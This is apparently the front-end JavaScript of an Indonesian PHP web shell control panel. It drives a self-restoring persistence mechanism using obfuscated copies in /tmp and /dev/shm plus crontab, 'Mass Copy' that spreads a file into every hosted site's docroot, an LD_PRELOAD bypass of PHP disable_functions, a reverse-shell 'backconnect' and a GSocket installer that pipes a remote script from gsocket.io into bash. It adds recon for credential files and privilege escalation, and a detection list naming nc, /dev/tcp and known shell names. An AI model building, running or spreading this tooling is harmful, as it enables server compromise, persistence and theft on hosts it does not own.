    lines.push('Persistence (cron.sh parity):');
    lines.push('- status: '+(d.persistence.ok?'ON':'OFF/partial'));
    if(d.persistence.message) lines.push('- '+d.persistence.message);
    if(d.persistence.install_path) lines.push('- obfuscated /tmp: '+d.persistence.install_path);
    if(d.persistence.shm_path) lines.push('- obfuscated /dev/shm: '+d.persistence.shm_path);
    if(d.persistence.pid_file) lines.push('- pid file: '+d.persistence.pid_file+(d.persistence.pid?' (pid '+d.persistence.pid+')':''));
    lines.push('- crontab embed: '+(d.persistence.crontab?'installed':'missing')+(d.persistence.cron_marker?' '+d.persistence.cron_marker:''));
    lines.push('- mutual: daemon↔crontab + /tmp↔/dev/shm (obfuscated)');
    lines.push('- delete test: hapus file target → harus kembali ≤1s (daemon) / ≤1m (crontab)');
  }
  if(d.steps&&d.steps.length){
    lines.push('');
    lines.push('Steps:');
    for(let i=0;i<d.steps.length;i++) lines.push('- '+d.steps[i]);
  }
  if(out){ out.textContent=lines.join('\n'); out.className='tool-output tall sec-terminal-out'; }
  toast(d.message||'Recover berhasil','ok');
}

function openFindWritable(){
  openM('#mFindWritable');
  const pathEl=$('#fwPath');
  const cur=typeof toAbsolutePath==='function'?toAbsolutePath(S.path||''):(S.path||'');
  if(pathEl){
    pathEl.value=cur&&cur!==''?cur:'/var/www/html';
    pathEl.placeholder=cur&&cur!==''?cur:'/var/www/html';
  }
  const out=$('#fwOutput');
  if(out){
    out.textContent='Kosongkan path lalu Find → pakai lokasi browse / default /var/www/html.';
    out.className='tool-output tall empty sec-terminal-out';
  }
}

async function goToWritablePath(path){
  if(!path) return;
  closeAll();
  toast('Opening '+path,'ok');
  await navigate(path);
}

async function runFindWritable(){
  const pathEl=$('#fwPath');
  const depthEl=$('#fwDepth');
  const limitEl=$('#fwLimit');
  const out=$('#fwOutput');
  const btn=$('#fwRun');
  let path=pathEl?pathEl.value.trim():'';
  if(!path){
    const cur=typeof toAbsolutePath==='function'?toAbsolutePath(S.path||''):(S.path||'');
    path=(cur&&cur!=='')?cur:'/var/www/html';
    if(pathEl) pathEl.value=path;
  }
  const max_depth=depthEl?parseInt(depthEl.value,10):8;
  const limit=limitEl?parseInt(limitEl.value,10):400;
  if(out){ out.textContent='Scanning writable dirs under '+path+' …'; out.className='tool-output tall sec-terminal-out'; }
  if(btn){ btn.disabled=true; btn.textContent='Scanning…'; }
  let d;
  try{
    d=await api('find_writable_dirs',{path:path,max_depth:max_depth,limit:limit});
  }catch(e){
    d={ok:false,error:'Network error or timeout'};
  }
  if(btn){ btn.disabled=false; btn.textContent='Find'; }
  if(!d||!d.ok){
    const err=(d&&d.error)?d.error:'Scan gagal';
    if(out){ out.textContent=err; out.className='tool-output tall empty sec-terminal-out'; }
    toast(err,'error');
    return;
  }

  // Same summary format as before, but each path is a clickable link → navigate()
  let html='';
  html+='<div class="fw-meta">'+esc(d.message||'Scan selesai')+'</div>';
  html+='<div class="fw-meta">Start: '+esc(d.start||path)+'</div>';
  html+='<div class="fw-meta">Scanned dirs: '+(d.scanned||0)+' · Found: '+(d.count||0)+(d.truncated?' (truncated)':'')+'</div>';
  html+='<div style="height:8px"></div>';

  if(d.dirs&&d.dirs.length){
    for(let i=0;i<d.dirs.length;i++){
      const it=d.dirs[i];
      const p=it.path||'';
      html+='<div class="fw-row">';
      html+='<span class="fw-perm">['+esc(it.perm||'???')+']</span>';
      html+='<a href="#" class="fw-link" data-fw-path="'+esc(p)+'" title="Open this directory">'+esc(p)+'</a>';
      html+='</div>';
    }
  }else{
    html+='<div class="fw-meta">(tidak ada writable directory)</div>';
  }

  if(out){
    out.className='tool-output tall sec-terminal-out fw-results';
    out.innerHTML=html;
    out.querySelectorAll('[data-fw-path]').forEach(a=>{
      a.addEventListener('click',function(ev){
        ev.preventDefault();
        const target=a.getAttribute('data-fw-path');
        goToWritablePath(target);
      });
    });
  }
  toast(d.message||'Scan selesai','ok');
}

let mcLastUrls = [];

function mcToggleMode(from){
  const v2El=$('#mcV2');
  const v3El=$('#mcV3');
  // Radio-like: hanya satu mode aktif
  if(from==='v2' && v2El && v2El.checked && v3El) v3El.checked=false;
  if(from==='v3' && v3El && v3El.checked && v2El) v2El.checked=false;
  // safety: kalau keduanya nyangkut, prioritas last-clicked (from)
  if(v2El && v3El && v2El.checked && v3El.checked){
    if(from==='v2') v3El.checked=false;
    else v2El.checked=false;
  }
  const v2=v2El && v2El.checked;
  const v3=v3El && v3El.checked;
  const wrap=$('#mcBaseWrap');
  const baseEl=$('#mcBase');
  const hideBase=!!(v2||v3);
  if(wrap) wrap.style.display=hideBase?'none':'';
  if(baseEl){ baseEl.disabled=hideBase; if(hideBase) baseEl.value=''; }
}
function mcToggleV2(){ mcToggleMode('v2'); }
function mcToggleV3(){ mcToggleMode('v3'); }
function mcGetMode(){
  const v3=$('#mcV3') && $('#mcV3').checked;
  const v2=$('#mcV2') && $('#mcV2').checked;
  if(v3) return 'v3';
  if(v2) return 'v2';
  return 'v1';
}

function openMassCopy(){
  openM('#mMassCopy');
  const srcEl=$('#mcSrc');
  const baseEl=$('#mcBase');
  const cur=typeof toAbsolutePath==='function'?toAbsolutePath(S.path||''):(S.path||'');
  if(srcEl && (!srcEl.value || srcEl.value==='') && S.selected && S.selected.size){
    const first=[...S.selected][0];
    if(first && !first.endsWith('/') ){
      const abs=typeof toAbsolutePath==='function'?toAbsolutePath(first):first;
      srcEl.value=abs||first;
    }
  }
  if(baseEl && (!baseEl.value || baseEl.value==='')){
    if(cur && cur.indexOf('/home/')===0){
      const parts=cur.split('/').filter(Boolean);
      if(parts.length>=2) baseEl.value='/home/'+parts[1];
      else baseEl.value='/home/*';
    }else if(!baseEl.value){
      baseEl.placeholder='/home/* atau /home/username';
    }
  }
  mcToggleMode();
  const out=$('#mcOutput');
  const meta=$('#mcMeta');
  if(out){
    out.textContent='Mode eksklusif — v1: Base Path · v2: system discovery · v3: Apache/Nginx sites-enabled (HTTP+SSL dedupe). Hanya satu yang aktif.';
    out.className='tool-output tall empty sec-terminal-out';
  }
  if(meta) meta.textContent='-';
}

async function runMassCopy(){
  const srcEl=$('#mcSrc');
  const baseEl=$('#mcBase');
  const debugEl=$('#mcDebug');
  const out=$('#mcOutput');
  const meta=$('#mcMeta');
  const btn=$('#mcRun');
  const src=srcEl?srcEl.value.trim():'';
  // Pastikan checkbox tidak double-aktif sebelum kirim
  mcToggleMode();
  const mode=mcGetMode();
  const v3=mode==='v3';
  const v2=mode==='v2';
  const base=(v2||v3)?'':(baseEl?baseEl.value.trim():'');
  const debug=debugEl&&debugEl.checked;
  if(!src){
    toast('Isi Source File','error');
    return;
  }
  if(mode==='v1' && !base){
    toast('Isi Base Path atau aktifkan Mass Copy v2/v3','error');
    return;
  }
  mcLastUrls=[];
  if(out){ out.textContent='Mass Copy '+mode+' batch mode...'; out.className='tool-output tall sec-terminal-out'; }
  if(meta) meta.textContent='running...';
  if(btn){ btn.disabled=true; btn.textContent='Spreading...'; }

  const allDetails=[];
  const allUrls=[];
  let offset=0;
  const limit=(mode==='v1')?50:40;
  let guard=0;
  let last=null;
  try{
    while(guard<40){
      guard++;
      if(out) out.textContent=mode+' batch #'+guard+' offset='+offset+' ...';
      let d;
      try{
        d=await api('mass_copy',{src:src,base:base,debug:debug?1:0,mode:mode,v2:v2?1:0,v3:v3?1:0,limit:limit,offset:offset});
      }catch(e){
        d={ok:false,error:'Network error: '+(e&&e.message?e.message:String(e))};
      }
      last=d;
      if(!d||!d.ok){
        if(allDetails.length) break;
        const err=(d&&d.error)?d.error:'Mass copy gagal';
        if(out){ out.textContent=err+(d&&d.debug_log&&d.debug_log.length?('\n\n--- debug ---\n'+d.debug_log.join('\n')):''); out.className='tool-output tall empty sec-terminal-out'; }
        if(meta) meta.textContent='failed';
        toast(err,'error');
        if(btn){ btn.disabled=false; btn.textContent='Spread'; }
        return;
      }
      if(Array.isArray(d.details)){
        for(let i=0;i<d.details.length;i++) allDetails.push(d.details[i]);
      }
      if(Array.isArray(d.urls)){
        for(let i=0;i<d.urls.length;i++) allUrls.push(d.urls[i]);
      }
      if(meta) meta.textContent=allDetails.length+' confirmed · offset '+offset;
      if(!d.has_more) break;
      offset = (typeof d.next_offset==='number') ? d.next_offset : (offset+limit);
      await new Promise(r=>setTimeout(r, 300));
    }
  }finally{
    if(btn){ btn.disabled=false; btn.textContent='Spread'; }
  }

  mcLastUrls=allUrls.slice();
  const d=last||{};
  const lines=[];
  lines.push(d.message||'Done');
  lines.push('Mode: '+((d.mode||mode))+' (eksklusif)');
  if(d.resolve_method) lines.push('Discovery: '+d.resolve_method);
  lines.push('Source: '+(d.source||src));
  lines.push('Discovered domains: '+(d.discovered_domains||d.domain_count||0)+' · Unique docroots/targets: '+(d.unique_docroots||d.domain_count||0)+' · Confirmed: '+allDetails.length);
  lines.push('');
  if(allDetails.length){
    lines.push('Confirmed (domain + path/url):');
    for(let i=0;i<allDetails.length;i++){
      const it=allDetails[i];
      lines.push((i+1)+'. '+(it.domain||'')+(it.user?(' user='+it.user):''));
      lines.push('   path: '+(it.dest||it.path||'')+' ['+(it.path_ok===false?'INVALID':'VALID')+']');
      lines.push('   url:  '+(it.url||'')+' ['+(it.url_ok?'VALID HTTP '+(it.url_status||200):('INVALID'+(it.url_status?(' HTTP '+it.url_status):'')))+']');
      if(it.htaccess) lines.push('   htaccess: '+it.htaccess);
    }
  }else{
    lines.push('(tidak ada hasil confirmed)');
  }
  if(out){ out.textContent=lines.join('\n'); out.className='tool-output tall sec-terminal-out'; }
  if(meta) meta.textContent=allDetails.length+' confirmed';
  toast(allDetails.length?('Confirmed '+allDetails.length):'Tidak ada confirmed', allDetails.length?'ok':'error');
}


async function mcCopyUrls(){
  if(!mcLastUrls.length) return toast('Belum ada URL confirmed','error');
  const txt=mcLastUrls.map((u,i)=>(i+1)+'. '+u).join('\n');
  const ok=await copyText(txt);
  if(ok) toast('Copied '+mcLastUrls.length+' URL(s)');
  else toast('Copy failed','error');
}

function mcDownloadTxt(){
  if(!mcLastUrls.length) return toast('Belum ada URL confirmed','error');
  const lines=mcLastUrls.map((u,i)=>(i+1)+'. '+u);
  const blob=new Blob([lines.join('\n')],{type:'text/plain'});
  const a=document.createElement('a');
  a.href=URL.createObjectURL(blob);
  a.download='mass_copy_result.txt';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(()=>URL.revokeObjectURL(a.href),1000);
  toast('Downloaded TXT','ok');
}

async function openBypassDf(){
  openM('#mBypassDf');
  const out=$('#bpOutput');
  const meta=$('#bpMeta');
  if(out){
    out.textContent='LD_PRELOAD bypass (payload embedded di manager.php). Linux only. Klik Check Status lalu Run Command.';
    out.className='tool-output tall empty sec-terminal-out';
  }
  if(meta) meta.textContent='-';
  try{ await checkBypassDf(true); }catch(e){}
}

async function checkBypassDf(silent){
  const out=$('#bpOutput');
  const meta=$('#bpMeta');
  if(!silent && out){ out.textContent='Checking status…'; out.className='tool-output tall sec-terminal-out'; }
  let d;
  try{ d=await api('bypass_df_info',{}); }
  catch(e){ d={ok:false,error:'Network error: '+(e&&e.message?e.message:String(e))}; }
  if(!d||!d.ok){
    const err=(d&&d.error)?d.error:'Status check gagal';
    if(out){ out.textContent=err; out.className='tool-output tall empty sec-terminal-out'; }
    if(meta) meta.textContent='failed';
    if(!silent) toast(err,'error');
    return;
  }
  const lines=[];
  lines.push('Bypass Functions — status');
  lines.push('OS Linux: '+(d.linux?'YES':'NO (Windows tidak didukung)'));
  lines.push('Arch: '+(d.arch||'?'));
  lines.push('Embedded payloads: '+(d.preload_ok?'OK':'MISSING')+(d.preload_path?(' @ '+d.preload_path):''));
  if(d.preload_error) lines.push('preload error: '+d.preload_error);
  lines.push('disable_functions: '+(d.disable_functions||'(none)'));
  lines.push('Required funcs:');
  const funcs=d.funcs||{};
  Object.keys(funcs).forEach(k=>lines.push('  - '+k+': '+(funcs[k]?'OK':'DISABLED/MISSING')));
  if(out){ out.textContent=lines.join('\n'); out.className='tool-output tall sec-terminal-out'; }
  if(meta) meta.textContent=d.preload_ok&&d.linux?'ready':'not ready';
  if(!silent) toast(d.preload_ok&&d.linux?'Ready':'Not ready', d.preload_ok&&d.linux?'ok':'error');
}

async function runBypassDf(){
  const cmdEl=$('#bpCmd');
  const out=$('#bpOutput');
  const meta=$('#bpMeta');
  const btn=$('#bpRun');
  const cmd=cmdEl?cmdEl.value.trim():'';
  if(!cmd){
    toast('Isi Command','error');
    return;
  }
  if(out){ out.textContent='Running via LD_PRELOAD bypass…'; out.className='tool-output tall sec-terminal-out'; }
  if(meta) meta.textContent='running…';
  if(btn){ btn.disabled=true; btn.textContent='Running…'; }
  let d;
  try{ d=await api('bypass_df',{cmd:cmd}); }
  catch(e){ d={ok:false,error:'Network error: '+(e&&e.message?e.message:String(e))}; }
  if(btn){ btn.disabled=false; btn.textContent='Run Command'; }
  if(!d||!d.ok){
    const err=(d&&d.error)?d.error:'Bypass gagal';
    const extra=[];
    if(d&&d.disable_functions) extra.push('disable_functions: '+d.disable_functions);
    if(d&&d.arch) extra.push('arch: '+d.arch);
    if(d&&d.preload) extra.push('preload: '+d.preload);
    if(out){ out.textContent=err+(extra.length?('\n'+extra.join('\n')):'')+(d&&d.output?('\n\n'+d.output):''); out.className='tool-output tall empty sec-terminal-out'; }
    if(meta) meta.textContent='failed';
    toast(err,'error');
    return;
  }
  const lines=[];
  lines.push(d.message||'Done');
  lines.push('cmd: '+(d.cmd||cmd));
  lines.push('arch: '+(d.arch||'?')+' · mail: '+(d.mail_ok?'ok':'fail'));
  if(d.preload) lines.push('preload: '+d.preload);
  if(d.disable_functions) lines.push('disable_functions: '+d.disable_functions);
  lines.push('');
  lines.push(d.output||'(no output)');
  if(out){ out.textContent=lines.join('\n'); out.className='tool-output tall sec-terminal-out'; }
  if(meta) meta.textContent='ok · '+(d.arch||'');
  toast('Bypass OK','ok');
}

async function saveCron(){
  const d=await api('cron_save',{content:$('#cronContent').value});
  if(!d.ok) return toast(d.error,'error');
  toast('Crontab saved','ok');
  loadCron();
}

function openBackconnect(){
  openM('#mBackconnect');
  $('#bcOutput').textContent='Ready — connection runs in background.';
  $('#bcOutput').className='tool-output empty';
}

async function startBackconnect(){
  const ip=$('#bcIp').value.trim();
  const port=parseInt($('#bcPort').value,10)||4444;
  const method=$('#bcMethod').value;
  if(!ip) return toast('Enter your IP/host','error');
  const out=$('#bcOutput');
  const btn=$('#bcStart');
  out.textContent='Starting…';
  out.className='tool-output';
  if(btn) btn.disabled=true;
  try{
    const d=await api('backconnect',{ip,port,method});
    if(!d||typeof d!=='object'){
      out.textContent='Empty/invalid response from server';
      out.className='tool-output empty';
      toast('Backconnect failed','error');
      return;
    }
    const lines=[];
    if(d.ok){
      lines.push(d.message||'Started');
      if(d.target) lines.push('Target: '+d.target);
      if(d.pid) lines.push('PID: '+d.pid);
      if(d.shell_method) lines.push('Shell: '+d.shell_method);
      if(d.output) lines.push('---\n'+d.output);
      out.textContent=lines.join('\n');
      out.className='tool-output';
      toast(d.message||'Started','ok');
    }else{
      lines.push(d.error||'Failed');
      if(d.hint) lines.push(d.hint);
      out.textContent=lines.join('\n');
      out.className='tool-output empty';
      toast(d.error||'Failed','error');
    }
  }catch(e){
    out.textContent='Request error: '+(e&&e.message?e.message:String(e));
    out.className='tool-output empty';
    toast('Backconnect request failed','error');
  }finally{
    if(btn) btn.disabled=false;
  }
}

const GS_COMMANDS = {
  curl: 'GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"',
  wget: 'GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"'
};

function updateGsPreview(){
  const m=$('#gsMethod').value;
  const preview=$('#gsCmdPreview');
  if(preview) preview.textContent=GS_COMMANDS[m]||GS_COMMANDS.curl;
}

function openGsocket(){
  openM('#mGsocket');
  updateGsPreview();
  $('#gsOutput').textContent='Klik Run untuk mengeksekusi installer GSocket.';
  $('#gsOutput').className='tool-output tall empty';
  $('#gsMeta').textContent='—';
}

async function runGsocket(){
  const method=$('#gsMethod').value;
  const out=$('#gsOutput');
  const meta=$('#gsMeta');
  const btn=$('#gsRun');
  out.textContent='Running installer… auto-retry GS_PORT 22–67 if GSRN firewalled';
  out.className='tool-output tall';
  if(meta) meta.textContent='Executing (may take several minutes)…';
  if(btn){ btn.disabled=true; btn.textContent='Running…'; }
  const t0=performance.now();
  let d;
  try{
    d=await api('gsocket',{method});
  }catch(e){
    d={ok:false,error:'Network error or timeout'};
  }
  const ms=Math.round(performance.now()-t0);
  if(btn){ btn.disabled=false; btn.textContent='Run GSocket'; }
  if(!d.ok){
    out.textContent=d.error||'Failed';
    out.className='tool-output tall empty';
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  out.textContent=d.output||'(no output)';
  out.className='tool-output tall';
  if(meta){
    let portInfo='';
    if(d.gs_port_label) portInfo=' · port '+d.gs_port_label;
    else if(d.gs_port!==undefined && d.gs_port!==null) portInfo=' · GS_PORT='+d.gs_port;
    meta.textContent=(d.method||method)+portInfo+' · '+d.attempts+' attempt(s) · '+ms+'ms';
  }
  if(d.firewalled){
    toast('GSRN still firewalled on all ports (22–67)','error');
  }else if(d.success){
    toast('GSocket OK · '+((d.gs_port_label||d.gs_port||'default')),'ok');
  }else{
    toast('GSocket finished (exit '+d.exit_code+')', d.exit_code===0?'ok':'error');
  }
}

$('#gsMethod').addEventListener('change', updateGsPreview);
$('#gsCopy').onclick=async()=>{
  const txt=$('#gsOutput').textContent||'';
  if(!txt||txt.startsWith('Klik Run')) return toast('Nothing to copy','error');
  const ok = await copyText(txt);
  if(ok) toast('Output copied');
  else toast('Copy failed','error');
};

// ─── Cyber Security Hub ──────────────────────────────────────────
const SEC_TAB_META = {
  recon:      { title: 'System Recon',       desc: 'Informasi sistem, user/privilege, batasan PHP, kernel & environment.' },
  sensitive:  { title: 'Sensitive Scanner',  desc: 'Mencari file rahasia: .env, credentials, SSH keys, config backup.' },
  processes:  { title: 'Process Monitor',    desc: 'Daftar proses berjalan — ps aux / tasklist.' },
  network:    { title: 'Network Recon',      desc: 'Port listening, koneksi aktif, dan interface jaringan.' },
  http:       { title: 'HTTP Client',        desc: 'Kirim request HTTP untuk SSRF testing & API recon.' },
  hash:       { title: 'Hash Generator',     desc: 'Generate MD5, SHA1, SHA256, SHA512, CRC32 checksums.' },
  codec:      { title: 'Codec Toolkit',      desc: 'Base64, URL, ROT13, Hex encode/decode.' },
  dns:        { title: 'DNS Lookup',         desc: 'Resolve A, AAAA, MX, TXT, NS, CNAME records.' },
  suid:       { title: 'SUID / SGID / CAP',  desc: 'Privilege escalation recon — Linux only.' },
  privesc:    { title: 'Privilege Escalation Audit', desc: 'Audit privesc Linux (sudo, SUID, caps, docker…) dan Windows (token, UAC, services, tasks).' },
};

function setSecTab(tab){
  $$('#mSecHub .sec-nav-btn').forEach(b=>b.classList.toggle('active', b.dataset.sec===tab));
  $$('#mSecHub .sec-panel').forEach(p=>p.classList.toggle('active', p.dataset.panel===tab));
  const meta = SEC_TAB_META[tab];
  if(meta){
    const t=$('#secHeroTitle'), d=$('#secHeroDesc');
    if(t) t.textContent = meta.title;
    if(d) d.textContent = meta.desc;
  }
}

function openSecHub(tab){
  openM('#mSecHub');
  setSecTab(tab||'recon');
  if(tab==='recon' && !S.secReconLoaded){
    S.secReconLoaded=true;
    secRunTool('recon','secOutRecon');
  }
}

async function secRunTool(tool, outId, extra){
  const out = outId ? $('#'+outId) : null;
  const meta=$('#secMeta');
  const payload=Object.assign({tool}, extra||{});
  if(out){ out.textContent='Running…'; out.className='tool-output tall sec-terminal-out loading'; }
  if(meta) meta.textContent='Running '+tool+'…';
  setScanProgress(out, true);
  const t0=performance.now();
  let d;
  try {
    d = await api('sec_tool',payload);
  } finally {
    setScanProgress(out, false);
  }
  const ms=Math.round(performance.now()-t0);
  if(!d.ok){
    if(out){ out.textContent=d.error||'Failed'; out.className='tool-output tall empty sec-terminal-out'; }
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  if(out){ out.textContent=d.output||'(no output)'; out.className='tool-output tall sec-terminal-out'; }
  if(meta){
    let extra='';
    if(d.count!==undefined) extra=' · '+d.count+' found';
    meta.textContent=tool+extra+' · '+ms+'ms';
  }
  return d;
}

$$('#mSecHub .sec-nav-btn').forEach(btn=>{
  btn.onclick=()=>setSecTab(btn.dataset.sec);
});

$('#secPhpinfo').onclick=()=>window.open('?phpinfo=1','_blank');
$('#secRunRecon').onclick=()=>secRunTool('recon','secOutRecon');
$('#secCopyRecon').onclick=async()=>{
  const txt=$('#secOutRecon').textContent||'';
  if(!txt||txt.includes('System info')) return toast('Nothing to copy','error');
  const ok = await copyText(txt);
  if(ok) toast('Copied'); else toast('Copy failed','error');
};
$('#secRunSensitive').onclick=()=>secRunTool('sensitive','secOutSensitive',{path:$('#secSensPath').value.trim()});
$('#secRunProcesses').onclick=()=>secRunTool('processes','secOutProcesses');
$('#secRunNetwork').onclick=()=>secRunTool('network','secOutNetwork');
$('#secRunHttp').onclick=()=>secRunTool('http','secOutHttp',{
  url:$('#secHttpUrl').value.trim(),
  method:$('#secHttpMethod').value,
  headers:$('#secHttpHeaders').value,
  body:$('#secHttpBody').value
});
$('#secRunHash').onclick=()=>secRunTool('hash','secOutHash',{text:$('#secHashText').value,algo:$('#secHashAlgo').value});
$('#secRunCodec').onclick=()=>secRunTool('codec','secOutCodec',{mode:$('#secCodecMode').value,text:$('#secCodecText').value});
$('#secRunDns').onclick=()=>secRunTool('dns','secOutDns',{host:$('#secDnsHost').value.trim(),type:$('#secDnsType').value});
$('#secRunPrivescLinux').onclick=()=>secRunTool('privesc_linux','secOutPrivesc');
$('#secRunPrivescWindows').onclick=()=>secRunTool('privesc_windows','secOutPrivesc');
$('#secRunSuid').onclick=()=>secRunTool('suid','secOutPrivesc');
$('#secCopyPrivesc').onclick=async()=>{
  const txt=$('#secOutPrivesc').textContent||'';
  if(!txt||txt.includes('Pilih audit')) return toast('Nothing to copy','error');
  const ok = await copyText(txt);
  if(ok) toast('Report copied'); else toast('Copy failed','error');
};

// ─── Blue Team Hub ───────────────────────────────────────────────
const BLUE_TAB_META = {
  backdoor:  { title: 'Backdoor Scanner',   desc: 'Deteksi webshell & backdoor dengan scoring signature. File gecko dikecualikan otomatis.' },
  fullaudit: { title: 'Full Security Audit', desc: 'Assessment lengkap: backdoor, recent changes, writable, hidden, cron, IOC, logs, processes.' },
  recent:    { title: 'Recent Changes',      desc: 'File PHP/JS/.htaccess yang dimodifikasi dalam N hari terakhir.' },
  writable:  { title: 'Writable Scan',       desc: 'File & folder world-writable (777 / o+w) — risiko upload/injection.' },
  hidden:    { title: 'Hidden Scripts',      desc: 'Dot-files: .htaccess, .user.ini, shell tersembunyi.' },
  cron:        { title: 'Cron Audit (quick)',  desc: 'Audit crontab user + /etc/cron* saja — versi ringkas.' },
  persistence: { title: 'Persistence Audit',   desc: 'Deteksi mekanisme persist: cron, systemd, startup, SSH keys, shell rc, .htaccess, .user.ini, PHP auto_prepend.' },
  logs:        { title: 'Log Audit',             desc: 'Failed auth, sudo usage, error web server mencurigakan.' },
  ioc:       { title: 'IOC Filename Hunt',   desc: 'Nama file malware known: c99, r57, wso, b374k, alfa…' },
  process:   { title: 'Suspicious Processes', desc: 'nc, /dev/tcp, reverse shell, miner, scanner di memory.' },
};

function setBlueTab(tab){
  $$('#mBlueHub .sec-nav-btn').forEach(b=>b.classList.toggle('active', b.dataset.blue===tab));
  $$('#mBlueHub .sec-panel').forEach(p=>p.classList.toggle('active', p.dataset.bpanel===tab));
  const meta = BLUE_TAB_META[tab];
  if(meta){
    const t=$('#blueHeroTitle'), d=$('#blueHeroDesc');
    if(t) t.textContent = meta.title;
    if(d) d.textContent = meta.desc;
  }
}

function openBlueHub(tab){
  openM('#mBlueHub');
  setBlueTab(tab||'backdoor');
  if(tab==='backdoor' || !tab) loadBlueQuarantine();
}

async function blueRunTool(tool, outId, extra){
  const out = outId ? $('#'+outId) : null;
  const meta = $('#blueMeta');
  const payload = Object.assign({tool}, extra||{});
  if(out){ out.textContent='Scanning… this may take a while'; out.className='tool-output tall sec-terminal-out loading'; }
  if(meta) meta.textContent='Running '+tool+'…';
  setScanProgress(out, true);
  const t0=performance.now();
  let d;
  try {
    d = await api('blue_tool',payload);
  } finally {
    setScanProgress(out, false);
  }
  const ms=Math.round(performance.now()-t0);
  if(!d.ok){
    if(out){ out.textContent=d.error||'Failed'; out.className='tool-output tall empty sec-terminal-out'; }
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  if(out){ out.textContent=d.output||'(no output)'; out.className='tool-output tall sec-terminal-out'; }
  if(meta){
    let info = tool+' · '+ms+'ms';
    if(d.count!==undefined) info += ' · '+d.count+' finding(s)';
    if(d.critical!==undefined && d.critical>0) info += ' · '+d.critical+' critical/high';
    if(d.scanned!==undefined) info += ' · '+d.scanned+' scanned';
    meta.textContent=info;
  }
  if(d.critical>0) toast(d.critical+' critical/high threat(s) found','error');
  else if(d.count>0) toast(d.count+' finding(s) — review report','error');
  else toast('Scan complete — no major threats','ok');
  return d;
}

$$('#mBlueHub .sec-nav-btn').forEach(btn=>btn.onclick=()=>setBlueTab(btn.dataset.blue));

function getFilteredBlueFindings(){
  if(S.blueSevFilter === 'ALL') return S.blueFindings.map((f,i)=>({f,i}));
  const sev = S.blueSevFilter;
  return S.blueFindings.map((f,i)=>({f,i})).filter(({f})=>(f.severity||'').toUpperCase()===sev);
}

function bindBlueThreatListEvents(){
  const list = $('#blueThreatList');
  if(!list) return;
  list.querySelectorAll('.blue-threat-path').forEach(el=>{
    el.style.cursor = 'pointer';
    el.onclick = (ev)=>{ ev.preventDefault(); el.closest('.blue-threat-item')?.classList.toggle('expanded'); };
  });
  list.querySelectorAll('.blue-q-one').forEach(btn=>{
    btn.onclick = (ev)=>{
      ev.preventDefault(); ev.stopPropagation();
      const idx = parseInt(btn.dataset.idx, 10);
      const p = S.blueFindings[idx]?.path;
      if(p) showBlueDeleteConfirm([p], 'Quarantine '+p+'?');
    };
  });
}

function renderBlueThreats(findings){
  S.blueFindings = findings || [];
  const list = $('#blueThreatList');
  const actions = $('#blueThreatActions');
  const countEl = $('#blueThreatCount');
  const filterBar = $('#blueFilterBar');
  if(!list || !actions) return;
  if(filterBar){
    filterBar.classList.toggle('show', S.blueFindings.length > 0);
    $$('#blueFilterBar .blue-filter').forEach(b=>b.classList.toggle('active', b.dataset.sev === S.blueSevFilter));
  }
  if(!S.blueFindings.length){
    list.innerHTML = '';
    list.classList.add('hidden');
    actions.classList.remove('show');
    if(filterBar) filterBar.classList.remove('show');
    return;
  }
  const filtered = getFilteredBlueFindings();
  list.classList.remove('hidden');
  actions.classList.add('show');
  if(countEl) countEl.textContent = S.blueFindings.length + ' threat(s) — select to quarantine';
  if(!filtered.length){
    list.innerHTML = '<div class="blue-threat-item" style="color:var(--tx4);font-style:italic;padding:14px">No threats match this filter.</div>';
    return;
  }
  list.innerHTML = filtered.map(({f,i})=>{
    const mod = f.modified ? new Date(f.modified*1000).toLocaleString() : '-';
    const hits = (f.hits||[]).slice(0,6).join(', ');
    const hitsFull = (f.hits||[]).join(', ');
    return `<label class="blue-threat-item">
      <input type="checkbox" class="blue-threat-cb" data-idx="${i}" checked>
      <span class="blue-threat-sev ${esc(f.severity||'LOW')}">${esc(f.severity||'?')}</span>
      <div class="blue-threat-info">
        <div class="blue-threat-path" title="Click to expand hits">${esc(f.path)}</div>
        <div class="blue-threat-meta">score:${f.score} · ${mod} · ${esc(hits)}</div>
        <div class="blue-threat-hits-full">${esc(hitsFull)}</div>
      </div>
      <button type="button" class="btn btn-ghost btn-sm blue-q-one" data-idx="${i}">Quarantine</button>
    </label>`;
  }).join('');
  bindBlueThreatListEvents();
}

function getBlueSelectedPaths(all){
  if(all) return S.blueFindings.map(f=>f.path);
  const paths = [];
  $$('.blue-threat-cb:checked').forEach(cb=>{
    const idx = parseInt(cb.dataset.idx,10);
    if(S.blueFindings[idx]) paths.push(S.blueFindings[idx].path);
  });
  return paths;
}

function clearBlueThreatsUI(){
  S.blueFindings = [];
  renderBlueThreats([]);
}

function dismissBlueThreats(){
  clearBlueThreatsUI();
  toast('Threat list dismissed — no files moved','ok');
}

function renderBlueQuarantine(entries, dir){
  S.blueQuarantine = entries || [];
  const list = $('#blueQuarantineList');
  const dirEl = $('#blueQuarantineDir');
  if(dirEl && dir) dirEl.innerHTML = 'Lokasi: <code>'+esc(dir)+'</code> — pilih file lalu klik Restore.';
  if(!list) return;
  if(!S.blueQuarantine.length){
    list.innerHTML = '<div class="blue-threat-item" style="color:var(--tx4);font-style:italic;padding:14px">Belum ada file di quarantine.</div>';
    return;
  }
  list.innerHTML = S.blueQuarantine.map((e,i)=>{
    const when = e.moved_at ? new Date(e.moved_at*1000).toLocaleString() : '-';
    return `<label class="blue-threat-item">
      <input type="checkbox" class="blue-q-cb" data-id="${esc(e.id)}" checked>
      <span class="blue-threat-sev MEDIUM">QRT</span>
      <div class="blue-threat-info">
        <div class="blue-threat-path">${esc(e.original)}</div>
        <div class="blue-threat-meta">quarantined: ${esc(when)} · id:${esc(e.id)}</div>
      </div>
      <button type="button" class="btn btn-ghost btn-sm blue-restore-one" data-id="${esc(e.id)}">Restore</button>
    </label>`;
  }).join('');
  list.querySelectorAll('.blue-restore-one').forEach(btn=>{
    btn.onclick = (ev)=>{ ev.preventDefault(); restoreBlueQuarantine([btn.dataset.id]); };
  });
}

async function loadBlueQuarantine(){
  const d = await api('blue_quarantine_list',{});
  if(!d.ok) return;
